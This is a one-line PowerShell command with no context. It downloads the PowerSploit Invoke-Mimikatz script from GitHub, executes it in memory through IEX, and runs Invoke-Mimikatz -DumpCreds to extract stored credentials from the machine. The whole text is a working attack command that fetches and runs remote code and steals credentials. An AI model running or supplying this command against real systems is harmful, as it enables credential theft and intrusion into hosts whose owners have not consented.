powershell.exe "IEX (New-Object Net.WebClient).DownloadString
    ('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/
    f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1');
    Invoke-Mimikatz -DumpCreds"
